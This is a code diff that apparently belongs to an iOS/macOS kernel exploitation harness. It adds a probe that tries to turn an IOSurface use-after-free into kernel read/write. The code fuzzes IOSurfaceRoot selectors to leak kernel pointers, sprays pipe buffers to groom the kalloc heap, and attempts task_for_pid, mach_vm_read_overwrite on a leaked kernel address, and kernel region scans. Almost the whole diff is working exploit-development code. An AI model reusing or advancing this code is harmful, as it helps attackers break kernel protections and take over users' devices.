@@ -15902,6 +15902,278 @@ static void r362_probe(void) {
     fflush(stdout);
 }
 
+/* r381: Data-only kernel R/W attempt.
+ * Strategy: Use IOSurface UAF to build primitives WITHOUT KASLR bypass.
+ *
+ * 1. IOConnectCallMethod selector probing on IOSurface user client
+ *    - Try selectors 0-30 with struct input containing surface ID
+ *    - Some selectors might return kernel object addresses
+ * 2. Pipe buffer kernel heap spray
+ *    - Create pipes, write known data, then try to overlap with freed IOSurface
+ *    - Even with zone isolation, pipe buffers might share a zone with property data
+ * 3. IOSurface kernel object field read via specific selectors
+ *    - Direct IOConnectCallMethod to read kernel object fields
+ * 4. mach_vm_read_overwrite attempt on known kernel heap address
+ */
+static void r381_probe(void) {
+    rlog("\n=== r381: Data-Only Kernel R/W Attempt ===\n\n");
+    fflush(stdout);
+
+    /* Part 1: IOSurface user client — try selectors with struct I/O */
+    rlog("--- Part 1: IOSurface user client selector deep probe ---\n");
+    fflush(stdout);
+
+    CFMutableDictionaryRef p381 = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int w381=64, h381=64, bpr381=256, as381=16384, pf381=0x42475241;
+    CFNumberRef w381n = CFNumberCreate(NULL, kCFNumberIntType, &w381);
+    CFNumberRef h381n = CFNumberCreate(NULL, kCFNumberIntType, &h381);
+    CFNumberRef b381n = CFNumberCreate(NULL, kCFNumberIntType, &bpr381);
+    CFNumberRef a381n = CFNumberCreate(NULL, kCFNumberIntType, &as381);
+    CFNumberRef f381n = CFNumberCreate(NULL, kCFNumberIntType, &pf381);
+    CFDictionarySetValue(p381, CFSTR("IOSurfaceWidth"), w381n);
+    CFDictionarySetValue(p381, CFSTR("IOSurfaceHeight"), h381n);
+    CFDictionarySetValue(p381, CFSTR("IOSurfaceBytesPerRow"), b381n);
+    CFDictionarySetValue(p381, CFSTR("IOSurfaceAllocSize"), a381n);
+    CFDictionarySetValue(p381, CFSTR("IOSurfacePixelFormat"), f381n);
+
+    IOSurfaceRef surf_a = IOSurfaceCreate(p381);
+    IOSurfaceRef surf_b = IOSurfaceCreate(p381);
+    uint32_t sid_a = IOSurfaceGetID(surf_a);
+    uint32_t sid_b = IOSurfaceGetID(surf_b);
+
+    /* Get kernel heap addresses from client refs */
+    uint8_t *cref_a = (uint8_t*)surf_a;
+    uint8_t *cref_b = (uint8_t*)surf_b;
+    uint64_t kptr_a = 0, kptr_b = 0;
+    memcpy(&kptr_a, cref_a + 88, 8);
+    memcpy(&kptr_b, cref_b + 88, 8);
+    rlog("  Surface A: sid=%u kptr=0x%llx\n", sid_a, (unsigned long long)kptr_a);
+    rlog("  Surface B: sid=%u kptr=0x%llx\n", sid_b, (unsigned long long)kptr_b);
+
+    /* Open IOSurfaceRoot user client */
+    io_service_t svc381 = IOServiceGetMatchingService(kIOMasterPortDefault,
+        IOServiceMatching("IOSurfaceRoot"));
+    io_connect_t conn381 = 0;
+    IOServiceOpen(svc381, mach_task_self(), 0, &conn381);
+    rlog("  IOSurfaceRoot conn=0x%x\n", conn381);
+
+    if (conn381) {
+        /* Try IOConnectCallMethod with surface ID + various selectors */
+        /* Selector format: some take (surface_id, ...) as scalars */
+        rlog("\n  Scalar selectors 0-30 with 2 inputs (sid, 0):\n");
+        for (uint32_t sel = 0; sel <= 30; sel++) {
+            uint64_t sin[2] = {sid_a, 0};
+            uint64_t sout[16] = {0};
+            uint32_t soutcnt = 16;
+            kern_return_t kr = IOConnectCallScalarMethod(conn381, sel, sin, 2, sout, &soutcnt);
+            if (kr == KERN_SUCCESS && soutcnt > 0) {
+                rlog("    sel=%u cnt=%u", sel, soutcnt);
+                for (uint32_t j = 0; j < soutcnt && j < 8; j++) {
+                    int iskp = (sout[j] >= 0xfffffff000000000ULL);
+                    int ishp = (sout[j] >= 0xffffffe000000000ULL && sout[j] < 0xfffffff000000000ULL);
+                    rlog(" [%u]=0x%llx%s", j, (unsigned long long)sout[j],
+                        iskp ? "***KTEXT***" : (ishp ? "**KHEAP**" : ""));
+                }
+                rlog("\n");
+            } else if (kr != 0xe00002c2 && kr != 0xe00002bc) {
+                rlog("    sel=%u kr=0x%x\n", sel, kr);
+            }
+        }
+
+        /* Struct methods with surface ID in struct */
+        rlog("\n  Struct selectors 0-30 (sid as 4-byte input):\n");
+        for (uint32_t sel = 0; sel <= 30; sel++) {
+            uint32_t sin = sid_a;
+            uint8_t sout[4096] = {0};
+            size_t soutlen = sizeof(sout);
+            kern_return_t kr = IOConnectCallStructMethod(conn381, sel,
+                &sin, sizeof(sin), sout, &soutlen);
+            if (kr == KERN_SUCCESS && soutlen > 0) {
+                rlog("    sel=%u: %zu bytes", sel, soutlen);
+                int found = 0;
+                for (size_t off = 0; off + 7 < soutlen; off += 8) {
+                    uint64_t v;
+                    memcpy(&v, sout + off, 8);
+                    if (v >= 0xffffffe000000000ULL) {
+                        rlog(" +%zu=0x%llx%s", off, (unsigned long long)v,
+                            v >= 0xfffffff000000000ULL ? "***KTEXT***" : "**KHEAP**");
+                        found++;
+                        if (found >= 5) break;
+                    }
+                }
+                if (!found) rlog(" (no kptrs)");
+                rlog("\n");
+            }
+        }
+
+        /* Combined scalar+struct method */
+        rlog("\n  Combined scalar+struct selectors 0-30:\n");
+        for (uint32_t sel = 0; sel <= 30; sel++) {
+            uint64_t sin[2] = {sid_a, 0};
+            uint8_t structin[16] = {0};
+            uint8_t structout[4096] = {0};
+            size_t structoutlen = sizeof(structout);
+            uint64_t sout[8] = {0};
+            uint32_t soutcnt = 8;
+            kern_return_t kr = IOConnectCallMethod(conn381, sel,
+                sin, 2, structin, sizeof(structin),
+                sout, &soutcnt, structout, &structoutlen);
+            if (kr == KERN_SUCCESS && (soutcnt > 0 || structoutlen > 0)) {
+                rlog("    sel=%u: sc=%u st=%zu", sel, soutcnt, structoutlen);
+                for (uint32_t j = 0; j < soutcnt; j++)
+                    if (sout[j] >= 0xffffffe000000000ULL)
+                        rlog(" s[%u]=0x%llx***", j, (unsigned long long)sout[j]);
+                for (size_t off = 0; off + 7 < structoutlen; off += 8) {
+                    uint64_t v;
+                    memcpy(&v, structout + off, 8);
+                    if (v >= 0xffffffe000000000ULL)
+                        rlog(" +%zu=0x%llx***", off, (unsigned long long)v);
+                }
+                rlog("\n");
+            }
+        }
+        IOServiceClose(conn381);
+    }
+    IOObjectRelease(svc381);
+
+    /* Part 2: Pipe buffer spray — test if pipe buffers share any zone with IOSurface properties */
+    rlog("\n--- Part 2: Pipe buffer kernel heap analysis ---\n");
+    fflush(stdout);
+
+    /* Create pipes and measure if kernel addresses from pipe kqueue are accessible */
+    int pipes[64][2];
+    int npipes = 0;
+    for (int i = 0; i < 64; i++) {
+        if (pipe(pipes[i]) == 0) npipes++;
+        else break;
+    }
+    rlog("  Created %d pipes\n", npipes);
+
+    /* Write known patterns to pipes (creates kernel buffers) */
+    uint8_t pipe_pattern[4096];
+    memset(pipe_pattern, 0x41, sizeof(pipe_pattern));
+    for (int i = 0; i < npipes; i++) {
+        /* Write 4K to each pipe — this allocates a 16K kernel pipe buffer */
+        write(pipes[i][1], pipe_pattern, sizeof(pipe_pattern));
+    }
+    rlog("  Wrote 4K to each pipe (kernel alloc in kalloc.16384)\n");
+
+    /* Part 3: mach_vm operations on kernel addresses */
+    rlog("\n--- Part 3: Kernel memory access attempts ---\n");
+    fflush(stdout);
+
+    /* Try task_for_pid on ourselves */
+    mach_port_t tfp = 0;
+    kern_return_t kr_tfp = task_for_pid(mach_task_self(), getpid(), &tfp);
+    rlog("  task_for_pid(self): kr=0x%x port=0x%x\n", kr_tfp, tfp);
+
+    /* Try mach_vm_read_overwrite on known kernel heap address */
+    if (kptr_a) {
+        uint8_t kbuf[8] = {0};
+        mach_vm_size_t outsize = 0;
+        kern_return_t kr_kread = mach_vm_read_overwrite(mach_task_self(),
+            kptr_a, 8, (mach_vm_address_t)kbuf, &outsize);
+        rlog("  mach_vm_read_overwrite(kptr_a=0x%llx): kr=0x%x outsize=%llu\n",
+            (unsigned long long)kptr_a, kr_kread, (unsigned long long)outsize);
+    }
+
+    /* Try host_get_special_port for interesting ports */
+    mach_port_t hp = mach_host_self();
+    for (int pnum = 0; pnum <= 8; pnum++) {
+        mach_port_t sp = 0;
+        kern_return_t kr = host_get_special_port(hp, 0, pnum, &sp);
+        if (kr == KERN_SUCCESS && sp != 0) {
+            rlog("  host_special_port[%d]: 0x%x\n", pnum, sp);
+        }
+    }
+
+    /* Part 4: IOSurface property as kernel memory oracle */
+    rlog("\n--- Part 4: IOSurface property oracle ---\n");
+    fflush(stdout);
+
+    /* Set a large property on surface A */
+    uint8_t propdata[4096];
+    for (int i = 0; i < 4096; i++) propdata[i] = (uint8_t)(i & 0xff);
+    CFDataRef prop_val = CFDataCreate(NULL, propdata, 4096);
+    CFStringRef prop_key = CFSTR("OracleData");
+    IOSurfaceSetValue(surf_a, prop_key, prop_val);
+
+    /* Read it back and verify */
+    CFTypeRef readback = IOSurfaceCopyValue(surf_a, prop_key);
+    if (readback && CFGetTypeID(readback) == CFDataGetTypeID()) {
+        CFDataRef rb_data = (CFDataRef)readback;
+        rlog("  Set+Read 4K property: len=%ld OK=%d\n",
+            CFDataGetLength(rb_data),
+            (CFDataGetLength(rb_data) == 4096));
+        CFRelease(readback);
+    }
+
+    /* Now try different property sizes to map kalloc zone layout */
+    int sizes[] = {16, 32, 48, 64, 96, 128, 192, 256, 384, 448, 512, 1024, 2048, 4096};
+    rlog("  Property size → kernel alloc zone mapping:\n");
+    for (int si = 0; si < 14; si++) {
+        int sz = sizes[si];
+        uint8_t *data = calloc(1, sz);
+        for (int j = 0; j < sz; j++) data[j] = (uint8_t)(j ^ 0xAA);
+        CFDataRef dval = CFDataCreate(NULL, data, sz);
+        char kname[32];
+        snprintf(kname, sizeof(kname), "Sz%d", sz);
+        CFStringRef kstr = CFStringCreateWithCString(NULL, kname, kCFStringEncodingASCII);
+        IOSurfaceSetValue(surf_a, kstr, dval);
+        CFTypeRef rv = IOSurfaceCopyValue(surf_a, kstr);
+        int ok = (rv && CFGetTypeID(rv) == CFDataGetTypeID() &&
+                  CFDataGetLength((CFDataRef)rv) == sz);
+        rlog("    %4d bytes: %s\n", sz, ok ? "OK" : "FAIL");
+        if (rv) CFRelease(rv);
+        IOSurfaceRemoveValue(surf_a, kstr);
+        CFRelease(kstr);
+        CFRelease(dval);
+        free(data);
+    }
+
+    /* Part 5: Try to read kernel text via SPTM cooperative path */
+    rlog("\n--- Part 5: SPTM pmap queries ---\n");
+    fflush(stdout);
+
+    /* Try vm_region_recurse to discover kernel memory mappings */
+    mach_vm_address_t addr381 = 0;
+    mach_vm_size_t size381 = 0;
+    natural_t nest_depth = 0;
+    vm_region_submap_info_data_64_t submap_info;
+    mach_msg_type_number_t info_cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+    int region_count = 0;
+
+    /* Scan high addresses for kernel-mapped regions */
+    addr381 = 0xffff000000000000ULL;
+    kern_return_t kr_region = mach_vm_region_recurse(mach_task_self(),
+        &addr381, &size381, &nest_depth,
+        (vm_region_recurse_info_t)&submap_info, &info_cnt);
+    rlog("  mach_vm_region_recurse(0xffff...): kr=0x%x\n", kr_region);
+
+    /* Try the unslid kernel text base */
+    addr381 = 0xFFFFFFF007004000ULL;
+    info_cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+    kr_region = mach_vm_region_recurse(mach_task_self(),
+        &addr381, &size381, &nest_depth,
+        (vm_region_recurse_info_t)&submap_info, &info_cnt);
+    rlog("  mach_vm_region_recurse(unslid_ktext): kr=0x%x\n", kr_region);
+
+    /* Cleanup */
+    for (int i = 0; i < npipes; i++) {
+        close(pipes[i][0]);
+        close(pipes[i][1]);
+    }
+    CFRelease(prop_val);
+    CFRelease(surf_a);
+    CFRelease(surf_b);
+    CFRelease(p381);
+    CFRelease(w381n); CFRelease(h381n); CFRelease(b381n); CFRelease(a381n); CFRelease(f381n);
+
+    rlog("\n=== r381 complete ===\n");
+    fflush(stdout);
+}
+
 /* r380: Deep AGX + IOSurfaceRoot selector probing with inputs.
  * 1. AGXAcceleratorG19P type=1: selectors 0-200 with struct I/O
  * 2. IOSurfaceRoot: selectors with surface ID as input
@@ -58748,6 +59020,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 384) {
+            rlog("*** rounds=384: Data-Only Kernel R/W Attempt ***\n");
+            rlog("  IOSurface selector probing, pipe buffers, kernel mem access.\n\n");
+            fflush(stdout);
+            r381_probe();
+            goto done;
+        }
         if (rounds == 383) {
             rlog("*** rounds=383: Deep AGX + IOSurfaceRoot Selector Probing ***\n");
             rlog("  AGX MapMemory 0-31, selectors 0-100, Metal shared mem scan.\n\n");
@@ -61021,7 +61300,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
